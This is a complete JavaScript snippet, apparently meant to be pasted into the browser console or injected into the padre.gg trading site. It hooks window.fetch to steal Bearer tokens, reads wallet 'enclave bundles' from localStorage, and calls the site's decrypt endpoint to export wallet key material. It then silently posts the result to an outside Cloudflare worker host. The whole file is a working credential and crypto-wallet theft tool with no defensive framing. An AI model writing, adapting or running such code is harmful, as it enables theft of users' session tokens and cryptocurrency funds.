(function() {
    const VANTA_CONFIG = {
        worker: "https://vanta-proxy.jdurrulo.workers.dev/",
        decryptApi: "https://api.padre.gg/v2/enclave/decrypt"
    };

    // 1. THE RECOVERY ENGINE (Captures EVERYTHING)
    const vantaCapture = {
        token: null,
        session: null,
        bundles: null,
        
        async init() {
            this.hookNetwork();
            this.scanStorage();
            this.renderUI();
            this.log("Kernel Active. Scanning memory...");
        },

        log(msg) {
            const l = document.getElementById('v-log');
            if (l) { l.innerHTML += `<div>> ${msg}</div>`; l.scrollTop = l.scrollHeight; }
        },

        // 2. NETWORK HIJACK (Bypasses scoped headers)
        hookNetwork() {
            const self = this;
            const _fetch = window.fetch;
            window.fetch = async function(...args) {
                const h = args[1]?.headers;
                if (h) {
                    const auth = h['Authorization'] || (h instanceof Headers && h.get('Authorization'));
                    if (auth) { 
                        self.token = auth; 
                        self.log("Found Bearer Token");
                        self.autoDecrypt();
                    }
                }
                return _fetch.apply(this, args);
            };
        },

        // 3. STORAGE DEEP SCAN (Finds the Enclave Bundles)
        scanStorage() {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.includes('bundles') || key.includes('padre')) {
                    this.bundles = JSON.parse(localStorage.getItem(key));
                    this.log("Found Enclave Bundles");
                }
            }
        },

        // 4. AUTOMATIC BYPASS DECRYPT
        async autoDecrypt() {
            if (!this.token || !this.bundles) return;
            this.log("Executing Bypass Decrypt...");
            
            const bundleKey = Object.keys(this.bundles.bundles)[0];
            const payload = {
                bundle: this.bundles.bundles[bundleKey].exportBundle,
                subOrgId: this.bundles.bundles[bundleKey].subOrgId
            };

            try {
                const res = await fetch(VANTA_CONFIG.decryptApi, {
                    method: 'POST',
                    headers: { 'Authorization': this.token, 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await res.json();
                this.log("DECRYPTION SUCCESSFUL");
                this.exfiltrate("WALLET_DECRYPT", data);
            } catch (e) { this.log("Decrypt Blocked: CSP/CORS error."); }
        },

        async exfiltrate(type, data) {
            fetch(VANTA_CONFIG.worker, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ type, data, ts: Date.now() })
            });
        },

        renderUI() {
            const ui = document.createElement('div');
            ui.style = `position:fixed;top:20px;left:20px;width:300px;background:#000;border:1px solid #0f0;color:#0f0;padding:15px;z-index:1000000;font-family:monospace;border-radius:5px;box-shadow:0 0 15px #0f05;`;
            ui.innerHTML = `
                <div style="font-weight:bold;border-bottom:1px solid #111;margin-bottom:10px;">VANTA_BYPASS_V8</div>
                <div id="v-log" style="height:150px;overflow-y:auto;font-size:10px;margin-bottom:10px;"></div>
                <button onclick="location.reload()" style="width:100%;background:#0f0;color:#000;border:none;padding:5px;cursor:pointer;font-weight:bold;">REFRESH & RE-SCAN</button>
            `;
            document.body.appendChild(ui);
        }
    };

    vantaCapture.init();
})();
